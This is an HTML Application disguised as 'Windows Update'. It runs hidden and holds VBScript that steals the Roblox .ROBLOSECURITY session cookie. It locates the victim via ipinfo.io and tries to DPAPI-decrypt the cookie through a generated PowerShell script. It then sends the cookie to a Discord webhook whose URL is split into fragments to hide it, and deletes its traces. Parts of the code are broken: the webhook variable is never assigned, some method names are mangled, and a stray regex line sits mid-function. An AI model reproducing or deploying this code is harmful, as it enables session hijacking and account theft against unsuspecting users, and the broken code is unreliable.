<title>Windows Update</title>
<HTA:APPLICATION
  ID="shadow"
  APPLICATIONNAME="shadow"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"
  SCROLL="no"
  SYSMENU="no"
/>
<script language="VBScript">
Option Explicit
Dim fso, shell, webhook, tempDir
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
$w="https" & "://di" & "scord" & ".com/" & "api/w" & "ebhoo" & "ks/15" & "36210" & "03453" & "35972" & "25/Bd" & "CQraM" & "q8r90" & "M0R-s" & "OGlFn" & "ACFES" & "F_j1f" & "dtKY5" & "MJE3s" & "t5IYf" & "BNndV" & "YnP48" & "EmVPy" & "Hsy9K" & "G"
tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
Function GetLocation()
  On Error Resume Next
  Dim xmlhttp
  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  xmlhttp.Open "GET", "https://ipinfo.io/json", False
  xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
  xmlhttp.Send
  If xmlhttp.Status = 200 Then
 GetLocation = xmlhttp.responseText
  Else
 GetLocation = "{""ip"":""unknown""}"
  End If
End Function
Function GetRobloxCookie()
  On Error Resume Next
  Dim path, raw, b64, b64File, psFile, jsonFile, cmd, exec, ts, startPos, endPos, output, errorText, jsonText, cookie
  path = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RbCks.dat"
  If Not fso.FileExists(path) Then
 GetRobloxCookie = "file not found"
 Exit Function
  End If
  Set ts = fso.OpenTextFile(path, 1)
  raw = ts.ReadAll
  ts.Close
  startPos = InStr(1, raw, """CksData""")
  If startPos = 0 Then
 GetRobloxCookie = "no CksData key"
 Exit Function
  End If
  startPos = InStr(startPos, raw, ":")
  If startPos = 0 Then
 GetRobloxCookie = "no colon"
 Exit Function
  End If
  startPos = startPos + 1
  Do While startPos <= Len(raw) And (Mid(raw, startPos, 1) = " " Or Mid(raw, startPos, 1) = """")
 startPos = startPos + 1
  Loop
  endPos = startPos
  Do While endPos <= Len(raw)
 If Mid(raw, endPos, 1) = """" Then Exit Do
 endPos = endPos + 1
  Loop
  b64 = Mid(raw, startPos, endPos - startPos)
  If Len(b64) < 20 Then
 GetRobloxCookie = "b64 too short"
 Exit Function
  End If
  b64File = tempDir & "\rc_b64.txt"
  Set ts = fso.CreateTextFile(b64File, True)
  ts.Write b64
  ts.Close
  psFile = tempDir & "\rc_dec.ps1"
  jsonFile = tempDir & "\rc_json.txt"
  Set ts = fso.CreateTextFile(psFile, True)
  ts.WriteLine "Add-Type -AssemblyName System.Security"
  ts.WriteLine "$ErrorActionPreference="
  ts.WriteLine "$b64 = Get-Content -Raw "
  ts.WriteLine "$bytes = [Convert]::FrmB64Str($b64.Trim())"
  ts.WriteLine "$decrypted = [System.Security.Cryptography.Pr0t3ct3dD4t4]::Unpr0t3ct($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
  ts.WriteLine "$json = [System.Text.Encoding]::UTF8.GetString($decrypted)"
  ts.WriteLine "$json | Out-File  -Encoding utf8"
  \.ROBLOSECURITY\s+([^\s]+)NO_MATCH Direct parsing from the decrypted file as backup
  jsonText = ""
  If fso.FileExists(jsonFile) Then
 Set ts = fso.OpenTextFile(jsonFile, 1)
 jsonText = ts.ReadAll
 ts.Close
  End If
  cookie = ""
  If Len(jsonText) > 0 Then
 Dim cookieStart, cookieEnd, line, parts
 cookieStart = InStr(1, jsonText, ".ROBLOSECURITY")
 If cookieStart > 0 Then
   cookieEnd = InStr(cookieStart, jsonText, vbCrLf)
   If cookieEnd = 0 Then cookieEnd = InStr(cookieStart, jsonText, vbLf)
   If cookieEnd = 0 Then cookieEnd = Len(jsonText)
   line = Mid(jsonText, cookieStart, cookieEnd - cookieStart)
   parts = Split(line, vbTab)
   If UBound(parts) >= 0 Then
  cookie = Trim(parts(UBound(parts)))
  If Left(cookie, 3) <> "_|W" Then
    Dim regex
    Set regex = New RegExp
    regex.Pattern = "\.ROBLOSECURITY\s+([^\s]+)"
    regex.Global = False
    Dim matches
    Set matches = regex.Execute(line)
    If matches.Count > 0 Then
   cookie = matches(0).SubMatches(0)
    End If
  End If
   End If
 End If
  End If
  fso.DeleteFile b64File, True
  fso.DeleteFile psFile, True
  fso.DeleteFile jsonFile, True
  If Len(cookie) > 20 Then
 GetRobloxCookie = cookie
  ElseIf Len(errorText) > 0 Then
 GetRobloxCookie = "PS ERROR: " & Left(errorText, 200)
  Else
 GetRobloxCookie = Trim(output)
  End If
End Function
Sub SendToWebhook(loc, cookie)
  On Error Resume Next
  Dim payload, xmlhttp
  Dim escapedLoc, escapedCookie
  escapedLoc = Replace(loc, "\", "\\")
  escapedLoc = Replace(escapedLoc, """", "\""")
  escapedLoc = Replace(escapedLoc, vbCrLf, "\n")
  escapedLoc = Replace(escapedLoc, vbCr, "\n")
  escapedLoc = Replace(escapedLoc, vbLf, "\n")
  escapedCookie = Replace(cookie, "\", "\\")
  escapedCookie = Replace(escapedCookie, """", "\""")
  escapedCookie = Replace(escapedCookie, vbCrLf, "\n")
  escapedCookie = Replace(escapedCookie, vbCr, "\n")
  escapedCookie = Replace(escapedCookie, vbLf, "\n")
  payload = "{""content"":""**shadow hit**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"
  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  xmlhttp.Open "POST", webhook, False
  xmlhttp.setRequestHeader "Content-Type", "application/json"
  xmlhttp.Send payload
End Sub
Sub Main()
  On Error Resume Next
  Dim loc, cookie
  loc = GetLocation()
  cookie = GetRobloxCookie()
  SendToWebhook loc, cookie
  window.close
End Sub
Main
</script>
